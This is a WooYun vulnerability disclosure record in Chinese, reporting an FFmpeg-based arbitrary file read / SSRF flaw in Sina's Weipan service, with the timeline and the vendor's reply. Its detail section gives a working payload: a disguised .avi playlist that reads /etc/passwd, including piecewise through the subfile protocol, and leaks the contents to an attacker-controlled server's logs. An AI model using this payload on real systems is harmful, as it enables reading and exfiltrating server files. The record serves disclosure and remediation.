{"id": 88076, "wybug_id": "wooyun-2016-0205914", "wybug_title": "新浪某站任意文件读取/SSRF                                      ", "wybug_corp": "新浪", "wybug_author": "路人甲", "wybug_date": "2016-05-07 07:30", "wybug_open_date": "2016-06-24 18:40", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取", "未授权访问"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-24：\t细节向公众公开  简要描述： 新浪某站任意文件读取 详细说明：  新浪微盘存在Ffmpeg文件读取漏洞，参考链接：http://zone.wooyun.org/content/27086，https://www.ffmpeg.org/ffmpeg-protocols.html#subfile1. 创建vdisk.avi，文件内容如下：\n#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,concat:http://test.com/header.m3u8|file:///etc/passwd#EXT-X-ENDLIST\n2. 创建header.m3u8，文件内容如下：\n#EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:,http://test1.com/?\n3. 将header.m3u8上传至自己的服务器上，将vdisk.avi上传至新浪微盘4. 然后在http://test1.com/的web日志中可查看读取的文件内容，在这里我使用了hawkeye平台的Web访问日志查询功能可方便查看结果：\n\n使用file:///etc/passwd只能查看到第一行内容，好像是遇到换行符时，换行符之后的文件内容不再返回（实践证明确实如此），但是可以使用subfile分段读取文件，因此修改之后的vdisk.avi内容如下：\n#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,concat:http://test.com/header.m3u8|subfile,,start,30,end,120,,:///etc/passwd#EXT-X-ENDLIST\n通过修改start和end值即可读取到文件的全部内容，测试得到的部分文件内容如下：\n\n只要肯花时间，读取任意文件不是问题！   漏洞证明：     修复方案：  升级Ffmpeg并且建议服务器禁止访问互联网   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-05-10 18:33 厂商回复： 感谢关注新浪安全，问题修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}